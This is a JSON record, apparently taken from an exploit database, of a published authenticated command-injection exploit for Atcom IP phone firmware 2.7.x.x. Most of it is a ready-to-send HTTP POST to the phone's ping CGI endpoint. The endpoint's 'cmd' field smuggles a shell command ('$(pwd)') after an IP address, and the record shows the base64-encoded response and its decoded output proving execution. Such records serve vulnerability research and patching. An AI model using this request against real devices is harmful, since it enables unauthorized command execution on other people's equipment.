{"source": "https://www.exploit-db.com/exploits/51742", "vulnName": "Atcom 2.7.x.x - Authenticated Command Injection", "vulnEDBID": "51742", "vulnCVE": "N/A", "author": "MOHAMMED ADEL", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2023-10-09", "vulnContent": "# Exploit Title: Atcom 2.7.x.x - Authenticated Command Injection\n# Google Dork: N/A\n# Date: 07/09/2023\n# Exploit Author: Mohammed Adel\n# Vendor Homepage: https://www.atcom.cn/\n# Software Link:\nhttps://www.atcom.cn/html/yingwenban/Product/Fast_IP_phone/2017/1023/135.html\n# Version: All versions above 2.7.x.x\n# Tested on: Kali Linux\n\n\nExploit Request:\n\nPOST /cgi-bin/web_cgi_main.cgi?user_get_phone_ping HTTP/1.1\nHost: {TARGET_IP}\nUser-Agent: polar\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 49\nAuthorization: Digest username=\"admin\", realm=\"IP Phone Web\nConfiguration\", nonce=\"value_here\",\nuri=\"/cgi-bin/web_cgi_main.cgi?user_get_phone_ping\",\nresponse=\"value_here\", qop=auth, nc=value_here, cnonce=\"value_here\"\n\ncmd=0.0.0.0$(pwd)&ipv4_ipv6=0&user_get_phone_ping\n\n\nResponse:\n\n{\"ping_cmd_result\":\"cGluZzogYmFkIGFkZHJlc3MgJzAuMC4wLjAvdXNyL2xvY2FsL2FwcC9saWdodHRwZC93d3cvY2dpLWJpbicK\",\"ping_cmd\":\"0.0.0.0$(pwd)\"}\n\nThe value of \"ping_cmd_result\" is encoded as base64. Decoding the\nvalue of \"ping_cmd_result\" reveals the result of the command executed\nas shown below:\n\nping: bad address '0.0.0.0/usr/local/app/lighttpd/www/cgi-bin'\n            "}